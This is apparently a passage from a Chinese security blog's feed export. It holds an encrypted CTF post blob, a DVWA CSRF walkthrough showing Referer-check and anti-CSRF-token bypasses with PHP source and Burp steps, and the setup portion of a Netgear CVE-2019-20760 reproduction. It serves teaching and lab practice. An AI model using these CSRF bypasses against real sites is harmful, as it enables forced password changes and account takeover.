892aab274078fb38c70d2bf47a4d922a1543f7d33c372bec469549e1476f967076eba958c4db817d2c68b16c0fe28b4c353aa9649328bffb0cf96d27263107b795ae950e5ceeb4cb868ba649fd09907730cf20fd9d1b1171497f678349842f7e8e2e64a50f7f60e5e132f09030a151b46c64f180809793bc43b5927b08a18409408b539c526813715d01537439e674f60b72086c81edfc6095ac946bd46c79984eaa6e435a4a33648f82f7789bff4f644e39d0a9b6123d2b70e5f714630209ffb506650fd23d48f857ad8fdbe9d88d158d41f5054448f0d79b27117215bf4923ffa71856735564c165cbc7f8fe3a49b6c6f9a5be14452999799720090aec3bfa0e307777e06353582ef5ff5dcdf02ed273063c26b274d390375cf99817951f2cbcb84567b3b7be0ca68487764a7aa66a5bbd80970bee76cb9a0db35725a700e96f7f76cd7f77ea7edc9f855272421d5e4c91495efb7506c05fe1c4956b135f57d3c18ebe79cc9a1ced2878c7183bafcef3334fed5c5e1f3a815e0d9bf8aabec63e17ffd3b1778ad6c2d2a92f1dcd89cbaa1581102c6888bba32b3ae3a4c57c6fee7fdcbfe1651129dcac7b7308b32d3a25b79abe8c9e153f079097f2287b94d10c2f7431b67d7198d4b4b888ec0ff7685770e969bcd75db634805753717a18207a1e0f9f9adf142944ae0d4593bb304612eb995bc8f6ed19d3fa12007f02386e126a05f00c36dc1d100cfcb461eabeba80dd66e67c815eca887e70c303403c0505507b18fa02eecb2bfb9d2373ba2b8930148c2be3b5438b993d8821ba167f830a3eaa1be81205b25e17340688cd81f069c5b2315590aaf64afd849af5908eb363d3408ca989e326ea5a1bd767686afa4734fbc900baa45b554d6f9f369acadf77ca0288d23759be41e036de33cf7ba37af99ffc18987cefa4d6415302b7d47c73aa562486b24d23b1c358e4118d65375df7ee73ab811b8574d40b872f7e5dbb8262bf0875cdf0185ebe41fa3fb867e6802f9a0579fa0fd1fe8bfddaca3cba353c41b7ce4aa2cb96c9c31e80f57fce6eddd9ae05e8b29bc21d6d43827365377ddaacea250a964e412fa3a477644db0d81063719297f3d57e2f6f76d16dfdb4aac7d1dae47d9a00b40d9e6fad5aec4fd3afbac5fc518b352b48cae0b054254b9c7530af0666ec5b3df0393d80604efe8c29b25e837ffdef694ba7d219f7a2be4efd2f2082c28678378475850ed7445b05298de68b471f61ba3aaae548de5ceed846f79921d3d1377b84a76a47c667c4713142e2a399f0ff0c2bc2660ca4d0cf755a10949d504f44ea649bf2cda1563a564bb84e497b6ce456659a584050a529922c834231bf551494c1d662b10ef9999c36b741fae94beaa49f629079723e372603f1d12b0cb56c51615d3818cf6c728a34e5c7bc53db0cba579053e7bf2250cdaa0b24b961ff458606460a8eb797a7d357e1fa7ba9c9d454508099fef1d4d01ad4b7ad2581000330d2946c9a98f2bed034db5008f1b4e72731856b4d7af1d7539c3b36619f3c1d0fb460fae122936894604a9477ef4b56839199d5151b4982fdca36bf454c344d0e75dc10da9d03b2d605e7389f5db57f3fe897eac83422c0085d8997340d20aa3170d587a547554514b8229436ffeb246068ffa5ad470d86e36467e088edc392f8c791aa15859902e6f28220b810e72d5604b6c5e0fcf827d16ea5a3a97cefaab06128eede65c8b858338b41606de8f5565af323a36532dc0004142ef01e92ba0a8d5049971b1fc63b3559196665ab1b424a5c42bcff1e739e160b2ae39347fc42b7e60910c63c22a65da1493f5d9180c4b41ae1b15df5e1f2efb62a71c38c9ab8ec1453e8e58dc63a2113b4a75548fae55b3198869e628346f5c2b179aa4b2d831001ada742cefd0cb6c6e5b64461115b0c79e5706aaf524251c4fef71a038624a8b343b1763ce4488036dc0a63fdda4b9324b7829a9e7aa2e7cf1918353800653d28ae20a9a180bf76aefa1581430e0a6c6a15808d57b1ec4e765d20d26770ec95578de56e3238c457e283b3db404363625011dc207af54f25a808dca693057f77c15aa0078c44e80b46f640a8a2e3eaec9ab0f86b3326ab32a833228ef622705d4072fc8381d17ca8b0fe39e5548bd24dc429d6d642b10072f0578282ba0c4fe62b6d0d91976894ff0ded91b600ff2dac0182142c144703c3c1500ec5fc4642507131927f601f903195bb63c5212a92407cb5bf54e2c75e675be672e5ceb8f88486ffd94e276ee8cfb142c0008a1ed41d1ac9418da41e9ee829d7c8d20e0ddedab80d1097ff824cee87af3b86387f6a44154aba1a1371589993df779f159cedf9e160bc66230cb5fee2a31f3974939c84f24167b0c88a9b7581caff55fa7d072531229ea3de88df0bfec769fcbbd9329c931f7d82facdd4d2afa1d434b7902060d050aa889d124cd4f9bf6139274f57a5aedf956770723987aeffbf32b1eab65f32ea1f2e8d19c78b543b9dc3c3243902acadbffd56c1f2b0dfc709aacc57390eec963b6790a03eaf386c7000293db47e14b2c6b5b6b435a69dbc31b129e1ac37f06c964bf94ba26048b952786b93145be95e601d4cebb64c84343abef4ab64111d5b6aebe1cf2c2d6516e7ca33b13ee9c66ccff746054fc3bf3e01ac1df6214c165f685fa22b7819588348b58b0ed3c32bda74b88c7c2070dbee9e000abae67488b26481e50aa402cf2afab8299b96dbe9165a110c3fb63defbc35c0a649364c74cba799f7d94c7e306dee08c90971a37cdd4199e8908527cadc08c41e84bf467886d607682d2ebe69d2ab3ba135bb9fcc8d29aefd1195bb85b92974dfe04d572a03814a7fb9033b26579087e96f07898c6343c05e16ea0c52a5ec6e6df40c17053fa6cc6acd2b322fafac139dca80420273444bdc9f5eac9f190fb1b39a509a2abdb12bb5b17a68aa0a120ce09644f3949893f0e64910f4783d8cd920b01c6441f00fa87db9fa21d9f6378f19f06cee0395cc4262ee2191ea2f88abc358b4949e900e1d0e4bc125838740a95966dbb34c8a55bd5cf37d762178507ba278c110f4fd3cf94f2b2f3403aea0a0ccd75f1793b1a533d08a82db837efdce562dbab40403e4d27ed4a984103bfff38aaa7b0d36e5e2403f6d3a88c5cebe009c1a0d9b5004eeb9420a6dc40c86b2d867a8ff9b3d1d9a6f5a131adfaf180e96de6c762e77d97ae2f0fd45d6082d7f86b8bbca173bb15b229e458cc8ff2022411f689b3b2dc0b9d6a2938930fef16b3f5253fde21a948bf1ed0456d95922d2628f073c4a8e0b4167a7b0b7a59d3eaa5bb18bf35c77cd32396b44ffa17131467eaa1e9239401e56553975ae97be0fe7a3fc46e6ff76243c5c3e8cd14488437ccb65da3d6f67a22ad9e5381d2520d547b69564f67d85b5e7ca96191f2c0075878727a71fb7ae68ad1bbf1c4c05352ed437af5c4f0f860b353296bdd05b5980d035b2699eee8afe0017e8280fc2e8bf972888fad2ba8ac378638a2e6452cff21108f2ae8fd755b83610c76d93297418553551c87b3954cdda43e038e9df3b94c1360ffcf454f39e77822ceb03655691e48d9d268c001daf47fedb09ec06f99b8021d68809458b229c1947b3d2c76f5e60527f5a115d601fce8da079a338c1e0c4e30adcefee2077b3ce316b2d13ebca4a495b7ebc83e7922ed4b4bec28597b115de05322049b1f58e8db74572645090d492a37f0f9dfecaadd941ccd2d5aade8299cddd334593b56fd38a045d0d567e1ca12ddb9d5d5ebc3a3acb941e1876aec6561ebdb8a280e7dd4b35dd042cf50329eb5d8329ef103426e2fc649cfa9c4da4e9981a916b4a1aee484ebf7a4d49e3c1ca1db9db9b7266eae71fdb8359daa29e8511cfb698af0400933a97fd287acc79445ce8ac8210f61250d097fa6974af248c5b46591281b9ef9b0a759efa972e1a1d3c7ade4b6a0e1c1c3f859aaab12b9db32d6eaeb0e201e94087cd0092e77f0fd57ed63631ca6f20696883cf5edf5ce5f37ca7a70eddbcc8cd9e993a7425716495c23322cf2ad6dffae3399b99153a09c7342db6abaab0f71da923a29991f218bb87deefcaeb1e2a9899a04e2949e5901c640ccf80a93176c4e6758049476932ffb44d8e005156db6730a3420f5b668c7046063b3696ea275a9633783113db9341457d77a8d6aba529d92d10c82b8ec85e49f7b89d4f02d76b5c390306a41195f19e3ac6e39161be9c3e6e9b3d637bcd54f1cb3cdf365ccd37cefe09127464cfa67f652172af75a4c5e043b53a4c2af91d502bceb75fc5471dd706763b57c31a8846023cd510fcc703cf72b532b096a81007784aa9b2a31c2f3f7eb59e168434d3cf7bb5dfe4c41af46b05dd476967d370371d7bccc165aae5ee50a3b65499dd210148eff3d048fa1fd78df5b8c407152d69dbcb354be</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Other</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-CSRF</title>
    <url>/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/</url>
    <content><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>一般来说，攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $current_user = dvwaCurrentUser();</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011094240554.png"
                      alt="image-20231011094240554"
                ></p>
<p>没有做任何防护。直接输入新密码即可。</p>
<ul>
<li>抓包查看</li>
</ul>
<p>将密码修改为 <code>123456</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011094451943.png"
                      alt="image-20231011094451943"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011095446264.png"
                      alt="image-20231011095446264"
                ></p>
<ul>
<li>Attack</li>
</ul>
<p><code>URL</code> 就是一个 <code>GET</code> 请求。诱骗用户点击此链接即可就会在用户不知情的情况下修改密码为 <code>123456</code>。</p>
<ol>
<li>拦截请求后，右击请求界面，选择生成CSRF PoC</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011102256026.png"
                      alt="image-20231011102256026"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103354780.png"
                      alt="image-20231011103354780"
                ></p>
<ol start="2">
<li>点击用浏览器中测试。</li>
</ol>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103421274.png"
                      alt="image-20231011103421274"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103930091.png"
                      alt="image-20231011103930091"
                ></p>
<p>复制弹出来的 <code>URL</code> ，将<code>burpsuite</code> 改为 <code>ip:8080</code> 比如 <code>127.0.0.1:8080</code>，访问这个 <code>URL</code> 将会自动跳转到修改密码 <code>URL</code> ，并修改密码为 <code>123456</code>。</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line">        $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $current_user = dvwaCurrentUser();</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&#x27;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>检测机制：在修改密码等敏感操作时，会检测 <code>referer</code> 请求来源地址，里面是否存在主机 <code>ip</code> 或域名。我们可以构造一个有效的 <code>Referer</code>，可以在攻击服务器上创建一个新的 <code>html</code> 页面，命名时 要含有 <code>csrf</code> 网站主机 <code>ip</code> 地址。所以这对本地搭建的无影响。我们通过回环和局域网 <code>Ip</code> 的方式来进行测试。</p>
<p>假如服务器地址为 <code>192.168.66.66</code>，即为 <code>SERVER_NAME</code>，我们只需要把我们构造的恶意页面文件名改为 <code>192.168.66.66.html</code>，<code>HTTP_REFERER</code>就会包含<code>192.168.66.66.html</code>,就可以绕过 <code>stripos</code>了。</p>
<ul>
<li>Attack</li>
</ul>
<ol>
<li>通过本地 <code>IP</code> 访问 <code>dvwa</code> 页面，利用 <code>burp</code> 抓包，并制作 <code>CSRF PoC</code>。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012145844804.png"
                      alt="image-20231012145844804"
                ></p>
<ol start="2">
<li>复制 <code>HTML</code> 代码，并将其命名为<code>192.168.56.1</code> 放在 <code>WWW</code> 目录下。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012145945233.png"
                      alt="image-20231012145945233"
                ></p>
<ol start="3">
<li>放行原来的包将密码改回 <code>password</code>，通过回环访问本地的<code>192.168.56.1.html</code>文件并抓包。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150205921.png"
                      alt="image-20231012150205921"
                ></p>
<p>可以看见 <code>referer</code> 和 <code>host</code> 的地址并不相同，我们将 <code>referer</code> 指向 攻击者服务器地址即 <code>192.168.56.1.html</code>即可绕过。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150452551.png"
                      alt="image-20231012150452551"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150521082.png"
                      alt="image-20231012150521082"
                ></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$change = false;</span><br><span class="line">$request_type = &quot;html&quot;;</span><br><span class="line">$return_message = &quot;Request Failed&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot; &amp;&amp; array_key_exists (&quot;CONTENT_TYPE&quot;, $_SERVER) &amp;&amp; $_SERVER[&#x27;CONTENT_TYPE&#x27;] == &quot;application/json&quot;) &#123;</span><br><span class="line">    $data = json_decode(file_get_contents(&#x27;php://input&#x27;), true);</span><br><span class="line">    $request_type = &quot;json&quot;;</span><br><span class="line">    if (array_key_exists(&quot;HTTP_USER_TOKEN&quot;, $_SERVER) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_new&quot;, $data) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_conf&quot;, $data) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;Change&quot;, $data)) &#123;</span><br><span class="line">        $token = $_SERVER[&#x27;HTTP_USER_TOKEN&#x27;];</span><br><span class="line">        $pass_new = $data[&quot;password_new&quot;];</span><br><span class="line">        $pass_conf = $data[&quot;password_conf&quot;];</span><br><span class="line">        $change = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (array_key_exists(&quot;user_token&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_new&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_conf&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;Change&quot;, $_REQUEST)) &#123;</span><br><span class="line">        $token = $_REQUEST[&quot;user_token&quot;];</span><br><span class="line">        $pass_new = $_REQUEST[&quot;password_new&quot;];</span><br><span class="line">        $pass_conf = $_REQUEST[&quot;password_conf&quot;];</span><br><span class="line">        $change = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($change) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $token, $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = mysqli_real_escape_string ($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new);</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $current_user = dvwaCurrentUser();</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;&quot; . $pass_new . &quot;&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        $return_message = &quot;Password Changed.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        $return_message = &quot;Passwords did not match.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line"></span><br><span class="line">    if ($request_type == &quot;json&quot;) &#123;</span><br><span class="line">        generateSessionToken();</span><br><span class="line">        header (&quot;Content-Type: application/json&quot;);</span><br><span class="line">        print json_encode (array(&quot;Message&quot; =&gt;$return_message));</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot; . $return_message . &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>checkToken</code>函数来实现 <code>Anti-csrf  token</code> 机制，用户每次访问更改密码页面时，服务器会返回一个随机的 <code>token</code>，之后每次向服务器发起请求，服务器会优先验证<code>token</code>，如果token正确，那么才会处理请求。所以我们在发起请求之前需要获取服务器返回的<code>user_token</code>，利用<code>user_token</code>绕过验证。这里我们可以使用<code>burpsuit</code>的<code>CSRF Token Tracker</code>插件可以直接绕过<code>user_token</code>验证。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012152409701.png"
                      alt="image-20231012152409701"
                ></p>
<p>添加 <code>Host</code> 和 <code>Name</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012152829738.png"
                      alt="image-20231012152829738"
                ></p>
<p>发送到 <code>repeater</code>，每次发送都会随机<code>token</code>的值，直接发送即可。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Netgear-CVE-2019-20760</title>
    <url>/2023/10/05/Netgear-CVE-2019-20760/</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><ul>
<li><strong>漏洞服务：</strong> <code>uhttpd</code></li>
<li><strong>漏洞类型：</strong> 远程命令执行</li>
<li><strong>影响范围：</strong> 1.0.4.26之前的NETGEAR R9000设备会受到身份验证绕过的影响</li>
<li><strong>解决建议：</strong> 更新版本</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
<li><strong>操作环境：</strong> ubuntu:22.04</li>
<li><strong>qemu-version：</strong> 8.1.1</li>
</ul>
<h3 id="仿真环境"><a href="#仿真环境" class="headerlink" title="仿真环境"></a>仿真环境</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.26.zip</span><br></pre></td></tr></table></figure></div>

<p>下载固件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -Mer R9000-V1.0.4.26.img </span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006204853421.png"
                      alt="image-20231006204853421"
                ></p>
<p>可通过 <code>binwalk</code> 常规解压获得文件系统。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006213813263.png"
                      alt="image-20231006213813263"
                ></p>
<p>检查 <code>ELF32</code> 文件架构为 <code>arm-32-little</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure></div>

<p>下载合适的虚拟机映像。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参考《CTF实战》by ChaMd5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&#x27;ens33&#x27;</span>: The NIC is that can connect internet</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33               # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up   # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006215529022.png"
                      alt="image-20231006215529022"
                ></p>
<p>配置网络。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">    -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure></div>

